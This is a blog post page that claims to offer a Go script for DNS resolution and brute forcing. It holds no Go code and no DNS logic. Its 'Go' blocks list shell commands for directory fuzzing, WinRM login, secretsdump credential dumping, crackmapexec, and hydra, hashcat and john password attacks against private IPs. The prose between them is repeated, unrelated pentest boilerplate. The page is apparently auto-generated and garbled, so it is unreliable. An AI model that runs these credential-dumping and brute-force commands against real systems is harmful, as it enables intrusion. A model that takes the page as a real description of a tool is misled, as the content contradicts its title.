---
TitleSEO: "DNS Resolver and Brute Forcer in Go | ZureFX"
TitlePost: "DNS Resolver and Brute Forcer — Go"
Author: "ZureFX"
Description: "A Go script for dns resolver and brute forcer. Built for security research and automation."
Keywords: "rust, automation, script, go"
URL: "https://zurefx.github.io/scripting/script-dns-resolver-and-brute-forcer-379.html"
URL_IMAGES: ""
Date: "2026-02-14"
Tags: "Rust, Automation, Script, Go"
Section: "scripting"
Lang: "en"
main_img: "script-dns-resolver-and-brute-forcer-379"
Permalink: "/scripting/script-dns-resolver-and-brute-forcer-379.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The scheduled task ran with elevated privileges and could be abused for escalation. The application stored sensitive credentials in an unencrypted configuration file. The kernel version was outdated and vulnerable to a publicly known exploit.

Built with **Go** for offensive security automation.

### Requirements

- Go
- `ffuf`
- `hashcat`
- `GetUserSPNs`

## Implementation

### Core Logic

Token impersonation allowed elevation to SYSTEM privileges on the target. Token impersonation allowed elevation to SYSTEM privileges on the target.

```go
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.13.145.95/FUZZ
evil-winrm -i 10.126.66.71 -u administrator -p 'P@ssw0rd!'
nmap -sCV -p995,464,445 10.29.152.152 -oN scan.txt
gobuster dir -u http://10.97.231.195/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Unconstrained delegation was enabled on the compromised machine. The kernel version was outdated and vulnerable to a publicly known exploit.

### Helper Functions

Authentication bypass was achieved through careful manipulation of the login mechanism. Token impersonation allowed elevation to SYSTEM privileges on the target.

```go
feroxbuster -h
impacket-secretsdump administrator:'P@ssw0rd!'@10.102.42.132
```

## Usage

### Basic Usage

Lateral movement was facilitated by reusing discovered credentials across services. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

### Advanced Options

The database credentials were hardcoded in the application source code. Weak file permissions allowed modification of critical system files. Initial enumeration revealed several interesting open ports on the target.

```bash
crackmapexec smb 10.74.147.72 -u administrator -p 'P@ssw0rd!' --shares
gobuster dir -u http://10.99.115.16/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.47.238.140 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## Output

### Example Output

Weak file permissions allowed modification of critical system files. Command injection was possible through unsanitized user input in the search functionality.

```
[+] Scanning target...
[+] Found 3 results
[+] Done in 16.59s
```
